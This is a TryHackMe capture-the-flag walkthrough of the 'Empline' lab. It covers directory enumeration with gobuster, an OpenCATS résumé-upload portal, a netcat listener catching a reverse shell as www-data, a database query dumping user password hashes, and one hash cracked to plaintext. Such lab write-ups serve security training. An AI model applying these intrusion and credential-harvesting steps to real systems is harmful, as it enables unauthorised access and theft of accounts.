# TryHackMe — Empline — Walkthrough



During initial browsing, the website presents as a single-page application with smooth anchor navigation; each header item jumps to a section on the same page. One exception was identified: hovering/clicking the Employment menu item reveals a link to job.empline.thm, indicating additional functionality hosted on a separate subdomain.



<img width="1418" height="870" alt="main page" src="https://github.com/user-attachments/assets/a0b85c0c-efc3-477c-a228-82f879c1e9a8" />




````
root@ip-10-201-9-244:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u job.empline.thm -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://job.empline.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/rss                  (Status: 301) [Size: 316] [--> http://job.empline.thm/rss/]
/xml                  (Status: 301) [Size: 316] [--> http://job.empline.thm/xml/]
/modules              (Status: 301) [Size: 320] [--> http://job.empline.thm/modules/]
/careers              (Status: 301) [Size: 320] [--> http://job.empline.thm/careers/]
/scripts              (Status: 301) [Size: 320] [--> http://job.empline.thm/scripts/]
/upload               (Status: 301) [Size: 319] [--> http://job.empline.thm/upload/]
/ajax                 (Status: 301) [Size: 317] [--> http://job.empline.thm/ajax/]
/test                 (Status: 301) [Size: 317] [--> http://job.empline.thm/test/]
/lib                  (Status: 301) [Size: 316] [--> http://job.empline.thm/lib/]
/src                  (Status: 301) [Size: 316] [--> http://job.empline.thm/src/]
/db                   (Status: 301) [Size: 315] [--> http://job.empline.thm/db/]
/js                   (Status: 301) [Size: 315] [--> http://job.empline.thm/js/]
/javascript           (Status: 301) [Size: 323] [--> http://job.empline.thm/javascript/]
/temp                 (Status: 301) [Size: 317] [--> http://job.empline.thm/temp/]
/vendor               (Status: 301) [Size: 319] [--> http://job.empline.thm/vendor/]
/images               (Status: 301) [Size: 319] [--> http://job.empline.thm/images/]
/attachments          (Status: 301) [Size: 324] [--> http://job.empline.thm/attachments/]
/ci                   (Status: 301) [Size: 315] [--> http://job.empline.thm/ci/]
/wsdl                 (Status: 301) [Size: 317] [--> http://job.empline.thm/wsdl/]
/server-status        (Status: 403) [Size: 280]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================

````
On the `/careers` page, we can browse open roles and click into a position to reach the application form. From there, the Apply view includes standard fields plus a file upload control for attaching a résumé or supporting documents, confirming the portal accepts user-supplied files during submission.


<img width="1424" height="831" alt="open cats" src="https://github.com/user-attachments/assets/f3a59011-ba3f-40e1-b356-803f28bdee17" />

<img width="1414" height="861" alt="career pool" src="https://github.com/user-attachments/assets/9f692dfa-eacd-45db-833a-10a698911532" />

Set up a listener, and we recieve a shell:

````
root@ip-10-201-9-244:~# nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.201.34.121 33000
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-201-34-121:/var/www/opencats/upload/careerportaladd$ whoami
whoami
www-data
www-data@ip-10-201-34-121:/var/www/opencats/upload/careerportaladd$ 

````

<img width="1136" height="484" alt="james pass" src="https://github.com/user-attachments/assets/566fa4d5-edc0-48c9-868b-eb8b0875873e" />


__________________________________________________________________________________________________________________________________________


````
MariaDB [opencats]>  select user_name, email, password, access_level from user;
< user_name, email, password, access_level from user;                        
+----------------+----------------------+----------------------------------+--------------+
| user_name      | email                | password                         | access_level |
+----------------+----------------------+----------------------------------+--------------+
| admin          | admin@testdomain.com | b67b5ecc5d8902ba59c65596e4c053ec |          500 |
| cats@rootadmin | 0                    | cantlogin                        |            0 |
| george         |                      | 86d0dfda99dbebc424eb4407947356ac |          400 |
| james          |                      | e53fbdb31890ff3bc129db0e27c473c9 |          200 |
+----------------+----------------------+----------------------------------+--------------+
4 rows in set (0.000 sec)

````
Crackstation
86d0dfda99dbebc424eb4407947356ac --> pretonnevippasempre


